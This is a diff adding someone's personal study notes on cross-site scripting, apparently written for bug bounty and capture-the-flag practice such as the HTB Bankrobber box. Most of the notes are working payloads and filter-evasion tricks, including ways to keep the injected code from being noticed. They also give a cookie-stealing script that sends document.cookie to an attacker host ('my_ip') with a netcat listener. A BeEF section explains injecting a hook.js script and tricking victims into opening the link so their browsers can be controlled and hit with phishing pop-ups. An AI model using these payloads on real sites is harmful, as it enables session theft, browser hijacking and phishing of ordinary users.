@@ -1,0 +1,278 @@
+Cross-Site Scripting(XSS):
+=========================
+Basics:
+	XSS => inserting JS into webpage
+	Types of XSS:
+		Reflected:(non-persistent)
+			it doesnt get stored on the server
+			its only one time thing
+		Stored:(persistent)
+			it gets stored on server
+			if we reload the page, we will still have the xss.
+			where to find it:
+				comment
+				review
+				complaint
+				edit profile
+				create profile
+		DOM based XSS:
+			DOM => Document Object Model
+			Here, we manipulate a site's existing JS code to execute malicious JS code
+			We can use DOM to acces user's sensitive info
+			It can be either reflected or stored
+			To test whether DOM is accessible:
+				alert(document.domain)
+			Example: pg-127-128 of "real world bug hunting"
+		Blind XSS:
+			Its a type of STORED XSS in which another user executes the XSS payload from a location where hacker cant access.
+			Example:
+				suppose we set our name as XSS payload. When see our profile, we see santized input. Its possible that our payload may execute when ADMIN opens the page listing of all new users.
+			Tool to test blind XSS => xsshunter
+		Self XSS:
+			It only affects the person who enters the payload
+	Basic Exploitation:
+		To inject JS, we need to use <script> tag:
+			<script>javascript_func(args1,args2)</script>
+		JS functions for XSS:
+			alert()
+			prompt()
+			confirm()
+			document.write("hello")
+			document.writeln("hello")
+				it adds a new line after writing text. Sometimes, write is sanitized, then, use writeln
+			they can take argumnets as:
+				'string'
+				"string"
+				`string`
+				number
+XSS in <textarea> tag:
+	textarea is used when we need to take mutliline input from user
+	payload => </textarea><script>alert()</script>
+XSS using HTML attributes:
+	functions to provide data to HTMl tags
+	example:
+		<img src="user_input"></img>
+		payload => "><script>alert()</script>
+XSS Using parameters which uses link:
+	many html tags are designed to take input in form of URL
+	what is a URL/link:
+		scheme://user:pass@host:port/path?query#fragment
+	usage:
+		site.com?imgurl=google.com/abcd
+		rendering:
+			<a href=google.com/abcd>hi</a>
+			<iframe src=google.com/abcd>hi</iframe>
+	Payload:
+		javascript:alert(1)
+		site.com?imgurl=javascript:alert(1)
+XSS using victim url:(XSS using HTML class)
+	site => site.com#hello
+	insepct page source => find "hello"
+	we see:
+		<div id="value" class="-----">
+			<h1 class="hello"></h1>
+	payload:
+		site.com#"><script>alert()</script>
+XSS inside <script> variable:
+	Sometimes, our search string(or whatever the vulnerable parameter is) is reflected as a value of some variable present in <script> tag
+	Example:
+		site.com?name=hacker
+			<script>
+				var name = 'hacker';
+			</script>
+		exploitation:
+			site.com?name=hacker';alert(document.cookie);'
+				<script>
+					var name = 'hacker';
+					alert(document.cookie);'';
+				</script>
+	JS strings:
+		'string'
+			PAYLOAD => '+PAYLOAD+' (quotes included)
+		"string"
+			PAYLOAD => "+PAYLOAD+" (quotes included)
+		`string`
+			PAYLOAD => `+PAYLOAD+` (quotes included)
+		usage of strings:
+			1. Function arguments: 
+				function(args1,'string')
+			2. Array Elements:
+				[el1,"string"]
+			3.Objects:
+				{property_name:value,property_name:"string"}
+		we can also use comments to get xss from strings:
+			'+alert()//'
+XSS using EVENT Handlers:
+	Basics:
+		Events:
+			clicking something
+			scrolling(moving mouse) over something
+		Event Handlers:(attributes)
+			onevent_name=JS
+			onmouseover=alert()
+			onclick=alert()
+			onerror=alert()
+				mostly used with <img>, executes JS when image doesnt load
+			Note:
+				onmouseover is better than onclick
+	usage:
+		site.com#hello' onmouseover='alert()
+			why hello?
+				bcoz we need something to move mouse over to
+			why ='alert()?
+				as it will be reflected in page code as follows:
+					h1 class='hello' onmouseover='alert()'
+	Better Exploitation:
+		goals:
+			1. execute quickly:
+				eliminate or minimize user input
+			2. remain undetected:
+		faster execution:
+			we will use CSS style for this
+			style:
+				<tag style= ></tag>
+				style=property_name:value;property_name:value;
+			payload:
+				onmouseover=alert() style=position:fixed;top:0;left:0;height:100/%25;width:100/%25;
+				position:fixed => fixed position
+					top:0 => on top
+					left:0 => on left
+					%25 => url encoding of '%'
+						url encoding => %<hex value of special character>
+						hex value of '%' => 25
+					height:100%25 => 100% height
+					width:100%25 => 100% width
+						by using 'height:100%25 and width:100%25', we can excute XSS by moving mouse over anywhere on webpage
+		Undetected:
+			CSS:
+				style=color:transparent;
+			this.removeAttribute:
+				its used for removing attrubtes, once they are executed
+				this.removeAttribute('onmouseover);this.removeAttribute('style');onmouseover=alert() style=position:fixed;top:0;left:0;height:100/%25;width:100/%25;
+XSS via JSON file upload:
+	some sites have options to upload json file
+	xss.json:
+		"data":{
+			"name": "#"><img src=/ onerror=alert()>",
+			"type": "AUTO_EVENT_VAR",
+			"autoEventVarMacro":{
+				"varType":"HISTORY_NEW_URL_FRAGMENT"
+			}
+		}
+Blind XSS:(Used in HTB::Bankrobber)
+	Somtimes, we dont get any result from alert/prompt, so we do this:
+		payloads:
+			<img src="my_ip/test.jpg" />
+			<script src="http://my_ip/test.js"></script>
+		kali>sudo nc -nvlp 80
+	Note:
+		Always try blind xss payload first, as it will work in both cases, blind and otherwise
+Cookie stealing using XSS:(used in HTB::Bankrobber)
+	XSS can be used to steal cookie only when "SITE HAS NO `httponly` flag"
+	alert(document.cookie)
+	Cookie Stealing:
+		cookie.js:
+			var request = new XMLHttpRequest();
+			request.open('GET', 'http://my_ip/?test='+document.cookie, true);
+			request.send()		
+		payload:
+			<script src="http://my_ip/cookie.js"></script>
+		kali:
+			nc -nvlp 80
+Earning higher bounties:
+	is it stored?
+	can u read cookies?
+		alert(document.cookie)
+	can we get other sensitive user data from DOM ?
+		alert(document.domain)
+HTML Encoding:
+	Symbols are encoded by html to maintain security
+	Double Quotes => " => &quot; or &#34;
+	Single Quotes => ' => &apos; or &#39;
+	Less than => < => &lt; or &#60;
+	Greater than => > => &gt; or &#62;
+Protection agianst XSS:
+	XSS Auditors:
+		browsers have this secuity mechanism to prevent users from opening malicious links that execute JS
+		Bypassing it:
+XSS filter Evasion:
+	XSS filters:
+		look at input and either remove them/replace them/block them
+	common evasion techniques:
+		script tag is filtered => shown as <filtered>
+		<> filtered:
+			< => &lt;
+			> => &gt;
+	For xss using attributes:
+		payload => "><script> => it failed
+		try single quote:
+			'><script>
+		if it fails:
+			EVENT Handlers
+	when "javascript:" is filtered:
+		using a #:
+			?q=abcd#<script>alert(1)</script>
+			anything after # doesnt get sent to server
+		case change:
+			XSS=xsS=xss=XSs
+		adding a tab:
+			open a text editor => press tab => copy the space
+			java<paste the space>script
+	when <script> is filtered:
+		<iframe src=javascript:alert()></iframe>
+		<img src=X onerror=alert()>
+		<svg/onload=alert()>
+XSS special payloads:
+	To remove whole webpage:
+		document.documentElement.innerHTML='' (only present in DOM)
+XSS via Markdown:
+	What is markdown:
+		Markdown is a simple language for writing and formatting content.
+		It’s used all over the place, from Gists and readme files on GitHub to the very article you’re reading right now.
+	site.com reads the line of markdown, then generates HTML. if this is not done safely, we could include malicious JS in the markdown for XSS.
+	usage:
+		markdown => html
+		[Click Me](https://www.example.com/) => <a href="https://www.example.com/">Click Me</a>
+		![The goodest boy](https://images.unsplash.com/the_good_boy.png) => <img src="https://images.unsplash.com/the_good_boy.png" alt="The goodest boy">
+	exploitation:
+		[Click Me](javascript:alert('Uh oh...')) => <a href="javascript:alert('XSS')">Click Me</a>
+		![Uh oh...]("onerror="alert('XSS')) => <img src="" onerror="alert('XSS') alt="Uh oh...">
+Automated:
+	XSStrike:(github)(helps with POST parameters)
+		python3 xsstrike.py -u "http://abcd.com/s.php?q=abcd" //GET
+		python3 xsstrike.py -u "http://abcd.com/s.php" --data "q=query" //POST
+		python3 xsstrike.py -u "http://abcd.com/s.php?q=abcd" -f file.txt
+			-f => using a custom list of payloads
+	XSShunter:
+		tool for blind xss
+	Burp Intruder:
+		Intercept request(POST/GET) and then send it to intruder
+		for wordlist => cheatsheet for tags (from portswigger)
+		Run Intruder:
+			if 400 => Fail
+			if 200 => Correct/Worked
+		then select the TAG which worked and chose one(suppose <body%20=1>)
+		Add parameters for argumenets: <body?20 $$=1>
+		for wordlist => cheatsheet for events (from portswigger)
+		Run Intruder:
+			if 400 => Fail
+			if 200 => Correct/Worked
+	BeEF Exploitation Framework:(127.0.0.1:3000)
+		basics: 
+			to start it: beef start
+			it gives 2 links:
+				127.0.0.1:3000/ui/authenciation
+					creds: beef:beef
+					control center
+				127.0.0.1:3000/hook.js
+					Obfuscated JS, which if injected into the victim's browser, victim's browser will contect back to our server
+			exploitation:
+				Suppose, we have found a vulnerable website, then use this payload:
+					<script src=http://my_ip:3000/hook.js></script>
+				And then, make a url link: 
+					site.com/ab/soap?search=<script src=http://my_ip:3000/hook.js></script>
+				Using social engineering, trick victim to open this site, as soon as they will open it, their browser's control will be transfered to our control center (UI).
+				In control center, we have a lot of exploits including social engineering:
+					social engineering-> petty theft: phishing pop-ups
+				NOTE:
+					to do this on a public site, then the url needs to have a public ip
